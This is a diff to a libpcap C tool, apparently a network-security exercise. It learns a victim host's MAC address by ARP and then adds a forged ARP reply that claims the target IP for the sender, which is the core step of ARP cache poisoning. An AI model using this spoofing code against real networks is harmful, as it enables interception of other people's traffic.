@@ -21,7 +21,7 @@ int main(int argc, char* argv[]) {
 	const u_char *pkt_data;
 	struct ether_header* eth_hdr;
 	struct ether_arp* arp_hdr;
-	u_char send_buf[SEND_BUF_SIZE];
+	// u_char send_buf[SEND_BUF_SIZE];
 	char errbuf[PCAP_ERR_BUF_SIZE];
 	char my_ip_addr_str[IP_ADDR_BUF_SIZE];
 	char my_mac_addr_str[MAC_ADDR_BUF_SIZE];
@@ -29,6 +29,7 @@ int main(int argc, char* argv[]) {
 	char *victim_ip_addr_str = NULL; //victim ip address string
 	char *target_ip_addr_str = NULL;
 	u_char victim_mac_addr[6];
+	char victim_mac_addr_str[MAC_ADDR_BUF_SIZE];
 	if (argc < 4) {
 		fprintf(stderr, "Usage: %s [-options] [Interface name] [victim IP] [target IP]\n", argv[0]);
 		fprintf(stderr, "\t[options]\n\t\t-v : verbose mode\n");
@@ -86,51 +87,6 @@ int main(int argc, char* argv[]) {
 
 	//send ARP Request
 	send_arp_packet(handle, my_mac_addr_str, NULL, my_ip_addr_str, victim_ip_addr_str, ARPOP_REQUEST);
-	// eth_hdr = (struct ether_header*)send_buf;
-	// sscanf("ff:ff:ff:ff:ff:ff", "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &eth_hdr->ether_dhost[0], &eth_hdr->ether_dhost[1], &eth_hdr->ether_dhost[2], &eth_hdr->ether_dhost[3], &eth_hdr->ether_dhost[4], &eth_hdr->ether_dhost[5]);
-	// if (opt_verbose) {
-	// 	printf("PACKET Dst MAC addr - %02X:%02X:%02X:%02X:%02X:%02X\n", eth_hdr->ether_dhost[0], eth_hdr->ether_dhost[1], eth_hdr->ether_dhost[2], eth_hdr->ether_dhost[3], eth_hdr->ether_dhost[4], eth_hdr->ether_dhost[5]);
-	// }
-
-	// sscanf(my_mac_addr_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &eth_hdr->ether_shost[0], &eth_hdr->ether_shost[1], &eth_hdr->ether_shost[2], &eth_hdr->ether_shost[3], &eth_hdr->ether_shost[4], &eth_hdr->ether_shost[5]);
-	// if (opt_verbose) {
-	// 	printf("PACKET Src MAC addr - %02X:%02X:%02X:%02X:%02X:%02X\n", eth_hdr->ether_shost[0], eth_hdr->ether_shost[1], eth_hdr->ether_shost[2], eth_hdr->ether_shost[3], eth_hdr->ether_shost[4], eth_hdr->ether_shost[5]);
-	// }
-	// eth_hdr->ether_type = ntohs(ETHERTYPE_ARP);
-	// if (opt_verbose) {
-	// 	printf("PACKET Ether type - %02X", (u_char)eth_hdr->ether_type);
-	// 	u_char *tmp = (u_char*)&eth_hdr->ether_type;
-	// 	tmp++;
-	// 	printf("%02X\n",*tmp);
-	// }
-	// arp_hdr = (struct ether_arp*)(send_buf + sizeof(struct ether_header));
-	// arp_hdr->ea_hdr.ar_hrd = ntohs(ARPHRD_ETHER);
-	// arp_hdr->ea_hdr.ar_pro = ntohs(ETHERTYPE_IP);
-	// arp_hdr->ea_hdr.ar_hln = 6;
-	// arp_hdr->ea_hdr.ar_pln = 4;
-	// arp_hdr->ea_hdr.ar_op = ntohs(ARPOP_REQUEST);
-
-	// sscanf(my_mac_addr_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &arp_hdr->arp_sha[0], &arp_hdr->arp_sha[1], &arp_hdr->arp_sha[2], &arp_hdr->arp_sha[3], &arp_hdr->arp_sha[4], &arp_hdr->arp_sha[5]);
-	// sscanf(my_ip_addr_str, "%hhd.%hhd.%hhd.%hhd", &arp_hdr->arp_spa[0], &arp_hdr->arp_spa[1], &arp_hdr->arp_spa[2], &arp_hdr->arp_spa[3]);
-	// sscanf("00:00:00:00:00:00", "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &arp_hdr->arp_tha[0], &arp_hdr->arp_tha[1], &arp_hdr->arp_tha[2], &arp_hdr->arp_tha[3], &arp_hdr->arp_tha[4], &arp_hdr->arp_tha[5]);
-	// sscanf(victim_ip_addr_str, "%hhd.%hhd.%hhd.%hhd", &arp_hdr->arp_tpa[0], &arp_hdr->arp_tpa[1], &arp_hdr->arp_tpa[2], &arp_hdr->arp_tpa[3]);
-
-	// if (opt_verbose) {
-	// 	int len = sizeof(struct ether_header) + sizeof(struct ether_arp);
-	// 	for (int i=0; i < len; i++) {
-	// 		printf("%02X ", send_buf[i]);
-	// 		if (i % 16 == 15) putchar('\n');
-	// 		else if (i % 8 == 7) putchar(' ');
-	// 	}
-	// 	putchar('\n');
-	// }
-	// int pack_len = sizeof(struct ether_header) + sizeof(struct ether_arp);
-	// if (pcap_sendpacket(handle, send_buf, pack_len) == -1) {
-	// 	fprintf(stderr, "pcap_sendpacket err %s\n", pcap_geterr(handle));
-	// 	exit(EXIT_FAILURE);
-	// }
-	//send ARP request end
-
 	//recv ARP reply
 	while(1) {
 		int status = pcap_next_ex(handle, &header_ptr, &pkt_data);
@@ -163,6 +119,8 @@ int main(int argc, char* argv[]) {
 		for (int i=0; i < 6; i++) {
 			victim_mac_addr[i] = arp_hdr->arp_sha[i];
 		}
+		sprintf(victim_mac_addr_str, "%02X:%02X:%02X:%02X:%02X:%02X", victim_mac_addr[0], victim_mac_addr[1],
+		 victim_mac_addr[2],victim_mac_addr[3],victim_mac_addr[4],victim_mac_addr[5]);
 		break;
 	}
 	//recv ARP reply
@@ -175,6 +133,8 @@ int main(int argc, char* argv[]) {
 		}
 		putchar('\n');
 	}
+
+	send_arp_packet(handle, my_mac_addr_str, victim_mac_addr_str, target_ip_addr_str, victim_ip_addr_str, ARPOP_REPLY);
 
 
 	pcap_close(handle);
